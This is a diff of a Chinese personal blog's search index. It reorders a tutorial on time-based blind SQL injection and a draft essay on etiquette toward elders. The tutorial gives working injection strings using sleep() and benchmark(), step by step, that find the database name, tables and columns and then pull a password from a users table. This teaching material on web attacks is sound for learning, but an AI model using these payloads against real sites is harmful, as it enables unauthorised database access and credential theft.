-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。建议有不明白的地方可以先看看<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>。</p>
-<span id="more"></span>
-
-<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时，甚至没有对错返回时，即可用此方式。</p>
-<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="sleep-second-函数"><a href="#sleep-second-函数" class="headerlink" title="sleep(second)函数"></a>sleep(second)函数</h2><p>延迟函数<br>作用：延迟second的时间<br>示例:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
-
-<h2 id="benchmark-count-expr-函数"><a href="#benchmark-count-expr-函数" class="headerlink" title="benchmark(count,expr)函数"></a>benchmark(count,expr)函数</h2><p>作用：可测试某些特定操作的执行速度<br>count：执行次数<br>expr：表达式,表示重复计算表达式count次，评估执行表达式的效率<br>expr表达式必须返回单个值，不允许返回多行记录或多列值，因此只能查询一个字段，且返回值只有1个，才适用于这个函数。<br>示例：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark(<span class="number">100</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span>))</span><br></pre></td></tr></table></figure>
-
-<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
-<li><p>判断数据库名长度</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>猜解数据库名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>判断数据库表名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>判断数据库字段名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))))&gt;100,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>取数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  </span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>说明：建议写脚本，脚本有机会以后添加</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
-<li><a href="https://blog.csdn.net/qq_43431158/article/details/97496092">sql注入学习——时间盲注</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>时间盲注</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件包含漏洞</title>
     <url>/2022/12/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含漏洞和文件上传漏洞还是有些相像的，但是文件包含难度要更大一些。</p>
@@ -5579,6 +5547,48 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>时间盲注</title>
+    <url>/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。建议有不明白的地方可以先看看<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>。</p>
+<span id="more"></span>
+
+<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时，甚至没有对错返回时，即可用此方式。</p>
+<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="sleep-second-函数"><a href="#sleep-second-函数" class="headerlink" title="sleep(second)函数"></a>sleep(second)函数</h2><p>延迟函数<br>作用：延迟second的时间<br>示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="benchmark-count-expr-函数"><a href="#benchmark-count-expr-函数" class="headerlink" title="benchmark(count,expr)函数"></a>benchmark(count,expr)函数</h2><p>作用：可测试某些特定操作的执行速度<br>count：执行次数<br>expr：表达式,表示重复计算表达式count次，评估执行表达式的效率<br>expr表达式必须返回单个值，不允许返回多行记录或多列值，因此只能查询一个字段，且返回值只有1个，才适用于这个函数。<br>示例：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark(<span class="number">100</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span>))</span><br></pre></td></tr></table></figure>
+
+<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
+<li><p>判断数据库名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>猜解数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断数据库表名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断数据库字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))))&gt;100,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  </span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>说明：建议写脚本，脚本有机会以后添加</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
+<li><a href="https://blog.csdn.net/qq_43431158/article/details/97496092">sql注入学习——时间盲注</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>时间盲注</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>汇编语言期末复习</title>
     <url>/2022/12/17/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>烦内！一到期末就不想复习了，真是的。<br>还是要强迫自己学习哇。</p>
@@ -5628,6 +5638,21 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>随想</tag>
         <tag>爱国</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅谈礼仪的对象</title>
+    <url>/2022/11/26/%E7%A4%BC%E4%BB%AA%E7%9A%84%E5%AF%B9%E8%B1%A1/</url>
+    <content><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>前些年在某本杂志上看到太宰治说的一段话。那段话大致意思是说：我们有晚辈对长辈的礼仪，学生对老师的礼仪；却没有长辈对晚辈的礼仪，老师对学生的礼仪。给我带来了极大的震撼，也是因此产生了写这篇文章的想法。<br>文章还在草稿中…不必看</p>
+<span id="more"></span>
+<h1 id="理所应当的礼仪"><a href="#理所应当的礼仪" class="headerlink" title="理所应当的礼仪"></a>理所应当的礼仪</h1><p>像我这样愚笨之人，从不会思考这样的事，只把这样的礼仪当作是理所当然的事。<br>也即，我被社会，所同化了。<br>为什么这么说呢？<br>仔细思考一下便知，我们的周围，无不充斥着晚辈应当尊敬长辈，学生应当尊重老师，这样的氛围。比如什么一日为师终生为父这样的话。<br>但从来没有长辈尊重晚辈，老师尊重学生的话出现。现实中也常常看到这样的例子，有的老师羞辱学生而学生不敢还嘴，长辈打骂晚辈却不会受到谴责。<br>仿佛只要是成为了这样一种强势地位的人，就能为所欲为。<br>说到底，为什么要对长辈，老师这样的人有尊重的礼仪呢？<br>这些礼仪最初是由什么人提出的呢？难道其实说，这不过是强者剥削弱者的一种手段吗？<br>礼仪道德的遵守与否，应当遵循自愿，而不是成为一种强制行为。对于敬爱的长辈老师，晚辈学生可以自主选择遵守礼仪。对于不值得尊重的，也可以选择不遵守。而不是依靠这样一种强势地位去压迫弱势地位的晚辈学生。<br>说到底，晚辈学生，根本上而言，没有选择权。一切都是上位者提出的规则。他们受到礼仪，只是单纯地享受。<br>未完待续…</p>
+]]></content>
+      <categories>
+        <category>随想</category>
+      </categories>
+      <tags>
+        <tag>随想</tag>
+        <tag>礼仪</tag>
       </tags>
   </entry>
   <entry>
@@ -5686,21 +5711,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </categories>
       <tags>
         <tag>诗</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>浅谈礼仪的对象</title>
-    <url>/2022/11/26/%E7%A4%BC%E4%BB%AA%E7%9A%84%E5%AF%B9%E8%B1%A1/</url>
-    <content><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>前些年在某本杂志上看到太宰治说的一段话。那段话大致意思是说：我们有晚辈对长辈的礼仪，学生对老师的礼仪；却没有长辈对晚辈的礼仪，老师对学生的礼仪。给我带来了极大的震撼，也是因此产生了写这篇文章的想法。<br>文章还在草稿中…不必看</p>
-<span id="more"></span>
-<h1 id="理所应当的礼仪"><a href="#理所应当的礼仪" class="headerlink" title="理所应当的礼仪"></a>理所应当的礼仪</h1><p>像我这样愚笨之人，从不会思考这样的事，只把这样的礼仪当作是理所当然的事。<br>也即，我被社会，所同化了。<br>为什么这么说呢？<br>仔细思考一下便知，我们的周围，无不充斥着晚辈应当尊敬长辈，学生应当尊重老师，这样的氛围。比如什么一日为师终生为父这样的话。<br>但从来没有长辈尊重晚辈，老师尊重学生的话出现。现实中也常常看到这样的例子，有的老师羞辱学生而学生不敢还嘴，长辈打骂晚辈却不会受到谴责。<br>仿佛只要是成为了这样一种强势地位的人，就能为所欲为。<br>说到底，为什么要对长辈，老师这样的人有尊重的礼仪呢？<br>这些礼仪最初是由什么人提出的呢？难道其实说，这不过是强者剥削弱者的一种手段吗？<br>礼仪道德的遵守与否，应当遵循自愿，而不是成为一种强制行为。对于敬爱的长辈老师，晚辈学生可以自主选择遵守礼仪。对于不值得尊重的，也可以选择不遵守。而不是依靠这样一种强势地位去压迫弱势地位的晚辈学生。<br>说到底，晚辈学生，根本上而言，没有选择权。一切都是上位者提出的规则。他们受到礼仪，只是单纯地享受。<br>未完待续…</p>
-]]></content>
-      <categories>
-        <category>随想</category>
-      </categories>
-      <tags>
-        <tag>随想</tag>
-        <tag>礼仪</tag>
       </tags>
   </entry>
 </search>
